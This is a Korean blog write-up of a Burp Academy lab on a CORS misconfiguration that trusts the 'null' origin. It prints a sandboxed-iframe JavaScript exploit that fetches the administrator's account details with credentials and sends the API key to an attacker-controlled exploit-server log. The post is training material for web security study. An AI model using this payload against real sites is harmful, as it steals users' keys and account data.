---
layout: post
title: "Burp Academy-CORS 취약점: CORS vulnerability with trusted null origin"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, CORS취약점]
toc: true
---

# 개요
- [CORS]({% post_url 2023-06-28-CORS-basic %})에 관련된 취약점이다. 
- CORS 취약점에 대한 설명은 [여기]({% post_url 2023-06-27-burp-academy-cors %}) 
- 문제 주소: : https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack
- 난이도: APPRENTICE (쉬움)


# 문제설명
- 서버에는 Origin헤더에 null을 지정해서 보내면 ACAO헤더에 null을 회신해주는 CORS 취약점이 있다. 
- 이 취약점을 이용해서 서버 관리자의 API Key를 얻어내는 자바스크립트 코드를 exploit server를 이용해서 서버로 보낸다. 
- 얻어낸 서버 관리자의 API Key를 제출하면 문제가 풀린다. 

```
This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter
```


# 풀이 
## CORS 취약점이 있는 곳 찾기 
[문제1번]({% post_url 2023-07-04-burp-academy-cors-1 %})과 마찬가지로 `GET /accountDetails` 요청에 CORS 취약점이 있는 것을 확인했다. Origin: null 헤더를 보내면  ACAO헤더에 null을 회신해준다. 

![CORS 취약점 확인](/images/burp-academy-cors-2-1.png)


## exploit 코드 만들기

iframe을 활용해서 exploit 코드를 만든다. 이 코드를 victim에게 실행하게 만들면 될 것이다. 코드를 저장하고 Deliver exploit to victim 버튼을 눌러 사이트 관리자에게 전달한다. 

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a94003d030f6dc582625682005a00a0.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-0a03002803fd6ddf82a155ea017a005c.exploit-server.net/log?key='+this.responseText;
};
</script>"></iframe>
```

## 억세스 로그를 보고 apiKey를 확인
exploit서버의 억세스 로그를 보면 관리자의 억세스가 확인된다. apiKey를 얻어내서 제출하면 문제가 풀린다. 

![풀이 성공](/images/burp-academy-cors-2-success.png)